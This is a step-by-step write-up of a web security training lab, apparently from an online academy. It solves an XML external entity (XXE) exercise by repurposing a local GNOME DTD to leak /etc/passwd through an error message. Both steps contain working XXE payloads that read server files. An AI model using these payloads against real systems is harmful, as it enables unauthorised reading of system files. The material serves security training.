# Exploiting XXE to retrieve data by repurposing a local DTD
* This lab has a "Check Stcok" feature that parses XML input but does not display the result.
	* To solve the lab, trigger an error message containing the contents of the `/etc/passwd` file.
	* You will need to reference an existing DTD file on the server and redefined an entity from it.
		* Systems using GNOME desktop environment often have a DTD at `/usr/share/yelp/dtd/docbookx.dtd` containing an entity called `ISOamso`.

### 1. Send the _POST /product/stock_ request to repeater to locate an local DTD to repurpose
* Add this entity definition to locate the local DTD
	* Since this server uses GNOME desktop, a common location for the local DTD is `/usr/share/yelp/dtd/docbookx.dtd`
```xml
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
%local_dtd;
]>
```
* It does not returned an error, which means that the file exists.

![18](https://user-images.githubusercontent.com/53956303/152891007-c09ccbd3-cd21-46c0-91af-653ab6f16fc5.png)
### 2. Insert an entity definition to repurpose the local DTD to obatin a sensitive file
* A common entity to repurpose is `ISOamso`
```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```
* Then, send the request.

![19](https://user-images.githubusercontent.com/53956303/152891594-b006d354-aea8-4410-b820-34522724b41d.png)
* As a result, contents of `/etc/passwd` is given and the lab is solved

![20](https://user-images.githubusercontent.com/53956303/152891657-9e6f6298-b08e-48b5-b1fb-48e8059252ff.png)
